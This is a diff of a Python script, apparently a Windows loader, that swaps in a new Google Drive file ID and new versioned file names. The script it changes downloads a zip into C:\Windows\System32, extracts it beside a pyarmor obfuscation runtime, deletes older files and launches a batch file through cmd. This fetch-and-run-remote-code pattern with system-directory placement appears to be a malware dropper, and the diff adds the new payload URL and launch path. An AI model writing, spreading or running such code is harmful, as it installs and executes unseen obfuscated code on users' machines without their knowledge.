@@ -100,10 +100,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\AesV8.1.py"
+    aesv3_path = r"C:\Windows\System32\AesV8.2.py"
     files_to_delete = [
-        r"C:\Windows\System32\AesV8.py",
-        r"C:\Windows\System32\aesv8.bat",
+        r"C:\Windows\System32\AesV8.1.py",
+        r"C:\Windows\System32\aesv8.1.bat",
         r"C:\Windows\System32\pyarmor_runtime_000000"
     ]
 
@@ -135,7 +135,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1j-XEZvVSI4bjATq-nHdcyk5rjpI8UVCx", "C:\\Windows\\System32\\plxplx.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1lEFyuq1fZVs9vgqLmZdkDova04ZnDXtV", "C:\\Windows\\System32\\plxplx.zip")
     zip_file = r'C:\Windows\System32\plxplx.zip'
     extract_dir = r'C:\Windows\System32'
     extract_zip(zip_file, extract_dir)
@@ -181,7 +181,7 @@ if not check_files_existx():
     exit()
 
 
-batch_file_path = r"C:\Windows\System32\aesv8.1.bat"
+batch_file_path = r"C:\Windows\System32\aesv8.2.bat"
 
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
